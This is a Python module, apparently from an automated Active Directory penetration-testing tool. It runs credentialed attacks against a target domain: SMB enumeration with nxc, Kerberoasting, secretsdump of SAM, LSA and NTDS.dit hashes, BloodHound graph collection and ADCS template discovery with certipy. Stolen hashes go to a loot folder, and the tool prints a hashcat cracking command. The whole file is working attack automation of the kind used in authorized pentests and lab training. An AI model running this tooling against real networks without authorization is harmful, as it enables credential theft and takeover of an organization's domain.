from __future__ import annotations

import asyncio
import os
from pathlib import Path

from .. import runner, ui
from ..parsers import extract_kerberoast_hashes
from ..state import Findings, loot_dir


def _auth_args(user: str, password: str | None, ntlm_hash: str | None) -> list[str]:
    args = ["-u", user]
    if ntlm_hash:
        args += ["-H", ntlm_hash]
    elif password is not None:
        args += ["-p", password]
    else:
        args += ["-p", ""]
    return args


async def nxc_full_enum(findings: Findings, user: str,
                       password: str | None, ntlm_hash: str | None) -> None:
    if not runner.has("nxc"):
        return
    ui.explain(
        "nxc smb with creds enumerates: --shares, --users, --groups, --pass-pol, "
        "--loggedon-users, --sessions, --disks. One-shot panoramic view."
    )
    ip = findings.target.ip
    domain = findings.target.domain or "."
    auth = _auth_args(user, password, ntlm_hash)
    base = [runner.resolve("nxc") or "nxc", "smb", ip] + auth + ["-d", domain]

    probes = [
        base + ["--shares"],
        base + ["--users"],
        base + ["--groups"],
        base + ["--pass-pol"],
        base + ["--loggedon-users"],
        base + ["--sessions"],
    ]
    for cmd in probes:
        ui.cmd(cmd)
    results = await asyncio.gather(*(runner.run(cmd, timeout=60) for cmd in probes))
    for cmd, result in zip(probes, results):
        flag = cmd[-1]
        if "STATUS_LOGON_FAILURE" in result.combined:
            ui.bad(f"{flag}: auth failed - bad creds?")
            return
        if "Pwn3d!" in result.combined:
            ui.crit(f"{flag} -> Pwn3d! (admin access on this host)")
            findings.notes.append(f"local admin via {flag}")
        if flag == "--users":
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 5 and not parts[4].startswith("[") and not parts[4].endswith("$"):
                    findings.add_user(parts[4])
        elif flag == "--shares":
            for line in result.stdout.splitlines():
                if "READ" in line or "WRITE" in line:
                    bits = line.split()
                    if len(bits) >= 5:
                        share = bits[4]
                        access = "WRITE" if "WRITE" in line else "READ"
                        findings.shares.append({
                            "name": share, "type": "Disk",
                            "comment": f"access={access}",
                        })


async def kerberoast(findings: Findings, user: str,
                    password: str | None, ntlm_hash: str | None) -> None:
    if not runner.has("GetUserSPNs"):
        return
    ui.explain(
        "Kerberoasting: TGS-REQ for every user with SPN -> AS-REP-style hash "
        "we crack offline (hashcat -m 13100). Service accounts often have weak passwords."
    )
    domain = findings.target.domain
    if not domain:
        return
    cmd = [
        runner.resolve("GetUserSPNs") or "impacket-GetUserSPNs",
        f"{domain}/{user}",
        "-dc-ip", findings.target.ip,
        "-request",
    ]
    if ntlm_hash:
        cmd += ["-hashes", ntlm_hash]
        ui.cmd(cmd)
        result = await runner.run(cmd, timeout=120)
    else:
        ui.cmd(cmd + ["<<< password>"])
        result = await runner.run(
            cmd, timeout=120, stdin_data=(password or "") + "\n",
        )

    hashes = extract_kerberoast_hashes(result.combined)
    new = [h for h in hashes if h not in findings.kerberoast_hashes]
    if new:
        findings.kerberoast_hashes.extend(new)
        out = loot_dir(findings.target.ip) / "kerberoast_hashes.txt"
        existing = out.read_text().splitlines() if out.exists() else []
        out.write_text("\n".join(sorted(set(existing) | set(new))) + "\n")
        for hash_str in new:
            user_part = hash_str.split("$")[3].split("@")[0] if "$" in hash_str else "?"
            ui.crit(f"Kerberoast: {user_part}")
        ui.good(f"saved {len(new)} TGS hash(es) -> {out}")
        ui.next_step(
            f"hashcat -m 13100 {out} /usr/share/wordlists/rockyou.txt",
            "Kerberoast hashes are mode 13100",
        )


async def secretsdump(findings: Findings, user: str,
                     password: str | None, ntlm_hash: str | None) -> None:
    if not runner.has("secretsdump"):
        return
    ui.explain(
        "secretsdump pulls SAM, LSA, NTDS.dit (DCSync if Domain Admin). "
        "Requires local admin OR replication rights on the DC."
    )
    domain = findings.target.domain or "."
    auth = f"{domain}/{user}"
    if ntlm_hash:
        target = f"{auth}@{findings.target.ip}"
        cmd = [
            runner.resolve("secretsdump") or "impacket-secretsdump",
            "-hashes", ntlm_hash, target,
        ]
    else:
        target = f"{auth}:{password}@{findings.target.ip}"
        cmd = [runner.resolve("secretsdump") or "impacket-secretsdump", target]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=300)

    if "STATUS_LOGON_FAILURE" in result.combined:
        ui.bad("secretsdump: auth failed")
        return
    if "ACCESS_DENIED" in result.combined or "STATUS_ACCESS_DENIED" in result.combined:
        ui.warn("secretsdump: access denied (need local admin or DCSync rights).")
        return

    out = loot_dir(findings.target.ip) / "secretsdump.txt"
    out.write_text(result.combined)
    nt_count = 0
    for line in result.stdout.splitlines():
        parts = line.split(":")
        if len(parts) >= 4 and len(parts[3]) == 32 and all(
            ch in "0123456789abcdef" for ch in parts[3].lower()
        ):
            findings.nt_hashes.append((parts[0], parts[3]))
            nt_count += 1
    if nt_count:
        ui.crit(f"secretsdump: harvested {nt_count} NT hash(es)")
        ui.good(f"full output -> {out}")
    else:
        ui.warn(f"secretsdump completed but no hashes parsed. Check {out}")


async def bloodhound_collect(findings: Findings, user: str,
                            password: str | None, ntlm_hash: str | None) -> None:
    if not runner.has("bloodhound-python"):
        return
    if not findings.target.domain:
        return
    ui.explain(
        "BloodHound collection: enumerates AD via LDAP+SMB, builds graph of "
        "users/groups/sessions/ACLs/GPOs. Output: ZIP -> import to BloodHound GUI."
    )
    out_dir = loot_dir(findings.target.ip) / "bloodhound"
    out_dir.mkdir(exist_ok=True)
    cmd = [
        runner.resolve("bloodhound-python") or "bloodhound-python",
        "-d", findings.target.domain,
        "-u", user,
        "-c", "All",
        "-ns", findings.target.ip,
        "-dc", findings.target.fqdn or findings.target.ip,
        "--zip",
    ]
    if ntlm_hash:
        cmd += ["--hashes", ntlm_hash]
    elif password is not None:
        cmd += ["-p", password]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=600, cwd=out_dir)
    if not result.ok:
        ui.warn(f"bloodhound-python exit={result.rc}. See {out_dir}")
        return
    zips = list(out_dir.glob("*.zip"))
    if zips:
        ui.good(f"BloodHound ZIP saved -> {zips[0]}")
        ui.explain("Open BloodHound GUI -> Upload Data -> drag the ZIP.")
    else:
        ui.warn(f"no ZIP produced; check json files in {out_dir}")


async def certipy_adcs(findings: Findings, user: str,
                      password: str | None, ntlm_hash: str | None) -> None:
    if not runner.has("certipy"):
        return
    ui.explain(
        "certipy-ad find: discovers ADCS templates and flags vulnerable ones "
        "(ESC1-ESC11). ESC1 = enrollee can request cert with arbitrary SAN."
    )
    out_dir = loot_dir(findings.target.ip) / "adcs"
    out_dir.mkdir(exist_ok=True)
    auth = f"{findings.target.domain or '.'}/{user}"
    cmd = [
        runner.resolve("certipy") or "certipy-ad", "find",
        "-u", f"{user}@{findings.target.domain}" if findings.target.domain else user,
        "-dc-ip", findings.target.ip,
        "-output", str(out_dir / "certipy"),
        "-stdout",
    ]
    if ntlm_hash:
        cmd += ["-hashes", ntlm_hash]
    elif password is not None:
        cmd += ["-p", password]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=180)
    if "Failed" in result.combined and "ESC" not in result.combined:
        ui.warn("certipy: no ADCS detected or unavailable.")
        return
    vuln_lines = [
        line for line in result.combined.splitlines()
        if "ESC" in line or "Vulnerable" in line
    ]
    if vuln_lines:
        for line in vuln_lines[:8]:
            ui.crit(line.strip())
        findings.vulns.append(f"ADCS issues found ({len(vuln_lines)} signals)")
    ui.good(f"certipy output -> {out_dir}")
